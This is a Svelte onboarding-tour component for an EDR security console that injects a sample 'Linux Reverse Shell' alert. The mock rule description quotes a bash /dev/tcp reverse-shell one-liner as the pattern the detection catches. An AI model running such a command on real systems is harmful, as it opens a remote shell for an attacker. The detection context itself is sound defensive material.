<script lang="ts">
	import { onMount, onDestroy } from 'svelte';
	import { base } from '$app/paths';
	import { goto, afterNavigate } from '$app/navigation';
	import { user, showOnboarding, showFlash } from '$lib/store';
	import { api } from '$lib/api';
	import Shepherd from 'shepherd.js';
	import 'shepherd.js/dist/css/shepherd.css';

	let tour: any = null;
	let alertInjected = false;

	function cleanupMockAlert() {
		if (typeof window === 'undefined') return;
		const stateObj = (window as any)._radegast_alert_page_state;
		if (stateObj?.cleanupMockAlert) {
			stateObj.cleanupMockAlert(104932);
		}
		alertInjected = false;
	}

	async function injectMockAlert() {
		if (typeof window === 'undefined') return;
		if (alertInjected) return;

		for (let i = 0; i < 10; i++) {
			if ((window as any)._radegast_alert_page_state?.injectMockAlert) {
				break;
			}
			await new Promise((resolve) => setTimeout(resolve, 100));
		}

		const stateObj = (window as any)._radegast_alert_page_state;
		if (!stateObj?.injectMockAlert) {
			console.warn('Could not inject mock alert: alert page state callbacks not found.');
			return;
		}

		const mockLog = {
			id: 104932,
			device_id: 1,
			time: "2026-06-18T10:41:32.000Z",
			severity: "critical",
			seen: false,
			alert_resolution: "none",
			triage_note: null,
			triggered_rule: {
				rule_id: "linux_reverse_shell",
				rule_type: "Sigma",
				rule_content: "Detects a bash connecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')",
				pack_id: 1,
				pack_name: "Essential Pack",
				pack_version: "1.0.0"
			}
		};

		const decrypted = {
			"@timestamp": "2026-06-18T10:41:32Z",
			"ecs.version": "9.3.0",
			"event.kind": "alert",
			"event.category": ["network"],
			"event.type": ["connection"],
			"event.action": "network-connection",
			"event.code": "3",
			"event.severity": 100,
			"event.module": "edr",
			"event.dataset": "edr.network",
			"event.provider": "ebpf",
			"host.os.type": "linux",
			"host.os.family": "linux",
			"rule.name": "Linux Reverse Shell Indicator",
			"rule.description": "Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')",
			"edr.rule.severity": "Critical",
			"edr.rule.engine": "Sigma",
			"process.executable": "/snap/novnc/170/bin/bash",
			"process.name": "bash",
			"process.command_line": "bash -c exec 7<>/dev/tcp/localhost/6080",
			"process.pid": 54710,
			"process.parent.executable": "/snap/novnc/170/bin/bash",
			"process.parent.name": "bash",
			"process.parent.command_line": "bash /snap/novnc/170/novnc_proxy",
			"process.parent.pid": 54641,
			"user.name": "vnc-admin",
			"destination.ip": "::1",
			"destination.port": 6080,
			"network.type": "ipv6",
			"network.direction": "egress",
			"related.ip": ["::1"],
			"related.user": ["vnc-admin"]
		};

		const device = {
			id: 1,
			name: "linux-box",
			last_seen: new Date().toISOString(),
			hostname: "linux-box",
			ip: "127.0.0.1",
			os: "linux",
			created_at: new Date().toISOString(),
			updated_at: new Date().toISOString()
		};

		stateObj.injectMockAlert(mockLog, decrypted, device);
		alertInjected = true;
	}

	async function completeTour() {
		try {
			await api.completeOnboarding();
			const me = await api.me();
			$user = me;
		} catch (e) {
			console.error('Failed to save onboarding completion state:', e);
		}
		cleanupMockAlert();
		showOnboarding.set(false);
		showFlash('Onboarding complete! You are ready to go.');
	}

	function handleCancel() {
		cleanupMockAlert();
		showOnboarding.set(false);
	}

	async function navigateAndDelay(path: string): Promise<void> {
		cleanupMockAlert();
		await goto(`${base}${path}`);
		await new Promise((resolve) => setTimeout(resolve, 350));
	}

	afterNavigate(({ to }) => {
		if (!tour) return;
		const toPath = to?.url.pathname || '';
		
		const toRelative = toPath.startsWith(base) ? toPath.slice(base.length) : toPath;
		
		if (tour.getCurrentStep()?.id === 'enable-pack' && toRelative.match(/^\/packs\/\d+$/)) {
			tour.next();
		} else if (tour.getCurrentStep()?.id === 'pack-detail-assignment' && toRelative === '/packs') {
			tour.back();
		}
	});

	onMount(async () => {
		tour = new Shepherd.Tour({
			useModalOverlay: true,
			defaultStepOptions: {
				classes: 'shadow-md radegast-tour-step',
				scrollTo: { behavior: 'smooth', block: 'center' },
				cancelIcon: {
					enabled: true
				}
			}
		});

		tour.on('cancel', handleCancel);
		tour.on('complete', completeTour);

		const defaultButtons = (stepIndex: number) => {
			const buttons = [];
			if (stepIndex > 1) {
				buttons.push({
					text: 'Back',
					action: tour.back,
					classes: 'btn btn-sm btn-outline-secondary'
				});
			}
			buttons.push({
				text: stepIndex === 16 ? 'Finish' : 'Next',
				action: tour.next,
				classes: 'btn btn-sm btn-primary'
			});
			return buttons;
		};

		// Step 1: Welcome
		tour.addStep({
			id: 'welcome',
			title: 'Welcome to Radegast!',
			text: 'Let\'s take a quick tour of the console so you know where everything is. This will only take a couple of minutes.',
			buttons: [
				{
					text: 'No, thanks, I know how this works',
					action: () => {
						tour.complete();
					},
					classes: 'btn btn-sm btn-outline-secondary me-2'
				},
				{
					text: 'Next',
					action: tour.next,
					classes: 'btn btn-sm btn-primary'
				}
			]
		});

		// Step 2: Dashboard Overview
		tour.addStep({
			id: 'dashboard-overview',
			title: 'Overview Dashboard',
			text: 'This is your overview page. It shows a summary of your total devices, active alerts, and total alert count at a glance.',
			attachTo: {
				element: '[data-tour="dashboard-stats"]',
				on: 'bottom'
			},
			beforeShowPromise: () => navigateAndDelay('/'),
			buttons: defaultButtons(2)
		});

		// Step 3: Sidebar Navigation
		tour.addStep({
			id: 'sidebar-nav',
			title: 'Sidebar Navigation',
			text: 'The sidebar is your main navigation hub. From here you can access all sections: Dashboard, Teams, Groups, Devices, Packs, and Alerts. Let\'s walk through each one.',
			attachTo: {
				element: '[data-tour="sidebar"]',
				on: 'right'
			},
			beforeShowPromise: () => navigateAndDelay('/'),
			buttons: defaultButtons(3)
		});

		// Step 4: Teams
		tour.addStep({
			id: 'teams',
			title: 'Teams & Collaboration',
			text: 'Teams are for <strong>collaborating with multiple people</strong>. Each team has granular permissions for managing packs, viewing logs, admin, and invites. The default team was created automatically with full permissions.',
			attachTo: {
				element: '[data-tour="nav-teams"]',
				on: 'right'
			},
			beforeShowPromise: () => navigateAndDelay('/teams'),
			buttons: defaultButtons(4)
		});

		// Step 5: Groups
		tour.addStep({
			id: 'groups',
			title: 'Device Groups',
			text: 'Groups let you organize devices (e.g. "Linux Servers" vs "Windows PCs"). Detection packs are enabled per group so you can run different security rules on different systems.',
			attachTo: {
				element: '[data-tour="nav-groups"]',
				on: 'right'
			},
			beforeShowPromise: () => navigateAndDelay('/groups'),
			buttons: defaultButtons(5)
		});

		// Step 6: Packs
		tour.addStep({
			id: 'packs',
			title: 'Detection Packs',
			text: 'Packs contain security detection rules. They come in three levels: <strong>Essential</strong> (recommended for all), <strong>Advanced</strong> (deeper coverage with environment-specific false-positive alerts), and <strong>Hunting</strong> (aggressive rules, lots of false positives).',
			attachTo: {
				element: '[data-tour="nav-packs"]',
				on: 'right'
			},
			beforeShowPromise: () => navigateAndDelay('/packs'),
			buttons: defaultButtons(6)
		});

		// Step 7: Pack Filters
		tour.addStep({
			id: 'pack-filters',
			title: 'Pack Filtering & Search',
			text: 'Use these filters to find packs by status (stable/beta), OS, false positive rate, or level. You can also search for packs by keyword.',
			attachTo: {
				element: '[data-tour="pack-filters"]',
				on: 'bottom'
			},
			beforeShowPromise: () => navigateAndDelay('/packs'),
			buttons: defaultButtons(7)
		});

		// Step 8: Enable a Pack C2A
		tour.addStep({
			id: 'enable-pack',
			title: 'Enable Your First Pack',
			text: 'To get started, we recommend enabling the <strong>Essential</strong> packs for your default group. Click a pack card to view details and assign it.',
			attachTo: {
				element: '[data-tour="first-pack-card"]',
				on: 'top'
			},
			beforeShowPromise: () => navigateAndDelay('/packs'),
			buttons: defaultButtons(8)
		});

		// Step 9: Pack Detail & Assignment
		tour.addStep({
			id: 'pack-detail-assignment',
			title: 'Assign Pack to Group',
			text: 'On this page you can see details of the pack and assign it to your device groups. Check the box for your group, select the version, and click <strong>Save Assignments</strong>.',
			attachTo: {
				element: '[data-tour="group-assignments-card"]',
				on: 'left'
			},
			beforeShowPromise: async () => {
				const currentPath = window.location.pathname;
				const relative = currentPath.startsWith(base) ? currentPath.slice(base.length) : currentPath;
				if (!relative.match(/^\/packs\/\d+$/)) {
					try {
						const packs = await api.listPacks();
						if (packs && packs.length > 0) {
							await navigateAndDelay(`/packs/${packs[0].id}`);
						} else {
							await navigateAndDelay('/packs');
						}
					} catch {
						await navigateAndDelay('/packs');
					}
				}
			},
			buttons: defaultButtons(9)
		});

		// Step 10: Navigate to Alerts + Mock Alert Card
		tour.addStep({
			id: 'alerts-list',
			title: 'Threat Triage & Alerts',
			text: 'This is where security alerts appear when detection pack rules trigger on your devices. We\'ve injected a <strong>sample alert</strong> to show you how they look.',
			attachTo: {
				element: '[data-tour="mock-alert"]',
				on: 'bottom'
			},
			beforeShowPromise: async () => {
				await navigateAndDelay('/alerts');
				injectMockAlert();
			},
			buttons: defaultButtons(10)
		});

		// Step 11: Mock Alert Detail
		tour.addStep({
			id: 'alerts-detail',
			title: 'Alert Triage Context',
			text: 'Select an alert to view its rule details, evidence (processes, files, networks, users), and the raw JSON log telemetry. You can add triage notes or configure exclusion rules.',
			attachTo: {
				element: '[data-tour="mock-alert-detail"]',
				on: 'left'
			},
			beforeShowPromise: async () => {
				await navigateAndDelay('/alerts');
				injectMockAlert();
			},
			buttons: defaultButtons(11)
		});

		// Step 12: Alert Notifications
		tour.addStep({
			id: 'alert-notifications',
			title: 'Email Notifications & Filter',
			text: 'Filter alerts with JSONata queries. If email notification is configured, alerts matching your severity threshold will trigger email alerts. Preferences can be customized in settings.',
			attachTo: {
				element: '[data-tour="alert-filters"]',
				on: 'bottom'
			},
			beforeShowPromise: async () => {
				await navigateAndDelay('/alerts');
				injectMockAlert();
			},
			buttons: defaultButtons(12)
		});

		// Step 13: Navigate to Devices
		tour.addStep({
			id: 'devices',
			title: 'Enrolling Devices',
			text: 'Here is where you manage your monitored systems. To start collecting security telemetry, you must add a device and run the agent installation command.',
			attachTo: {
				element: '[data-tour="nav-devices"]',
				on: 'right'
			},
			beforeShowPromise: () => navigateAndDelay('/devices'),
			buttons: defaultButtons(13)
		});

		// Step 14: Add Device Button
		tour.addStep({
			id: 'add-device',
			title: 'Add a Device',
			text: 'Click <strong>Add Device</strong> to register a new machine. Choose a hostname and associate it with a group.',
			attachTo: {
				element: '[data-tour="add-device"]',
				on: 'bottom'
			},
			beforeShowPromise: () => navigateAndDelay('/devices'),
			buttons: defaultButtons(14)
		});

		// Step 15: Installation Command
		tour.addStep({
			id: 'install-command',
			title: 'Installation Command',
			text: 'Once registered, copy the OS-specific installer command (e.g. <code>curl | sh</code> for Linux or PowerShell command for Windows). Run this on the host to configure background agent services.',
			attachTo: {
				element: '[data-tour="nav-devices"]',
				on: 'bottom'
			},
			beforeShowPromise: () => navigateAndDelay('/devices'),
			buttons: defaultButtons(15)
		});

		// Step 16: Finish
		tour.addStep({
			id: 'finish',
			title: 'Onboarding Complete!',
			text: 'You\'re all set! 1. Enable <strong>Essential</strong> packs. 2. Enroll a device. 3. Watch for alerts. Re-run this tour at any time from Settings.',
			buttons: defaultButtons(16)
		});

		// Start the tour
		tour.start();
	});

	onDestroy(() => {
		if (tour) {
			tour.cleanup();
		}
		cleanupMockAlert();
	});
</script>

<style>
	:global(.radegast-tour-step) {
		background-color: var(--bs-body-bg) !important;
		color: var(--bs-body-color) !important;
		border: 1px solid var(--bs-border-color) !important;
		border-radius: 3px !important;
		padding: 0.75rem !important;
		max-width: 380px !important;
		font-family: inherit !important;
	}

	:global(.shepherd-header) {
		background-color: var(--bs-secondary-bg) !important;
		border-bottom: 1px solid var(--bs-border-color) !important;
		padding: 0.5rem 0.75rem !important;
	}

	:global(.shepherd-title) {
		font-weight: 700 !important;
		color: var(--bs-body-color) !important;
		font-size: 1rem !important;
	}

	:global(.shepherd-text) {
		color: var(--bs-body-color) !important;
		font-size: 0.875rem !important;
		padding: 0.75rem !important;
		line-height: 1.5 !important;
	}

	:global(.shepherd-footer) {
		padding: 0.5rem 0.75rem !important;
		display: flex;
		gap: 0.5rem;
		justify-content: flex-end;
	}

	:global(.shepherd-footer button) {
		border-radius: 3px !important;
		font-weight: 600 !important;
		font-size: 0.8rem !important;
		padding: 0.35rem 0.75rem !important;
	}

	:global(.shepherd-cancel-icon) {
		color: var(--bs-secondary-color) !important;
	}

	:global(.shepherd-cancel-icon:hover) {
		color: var(--bs-danger) !important;
	}
</style>
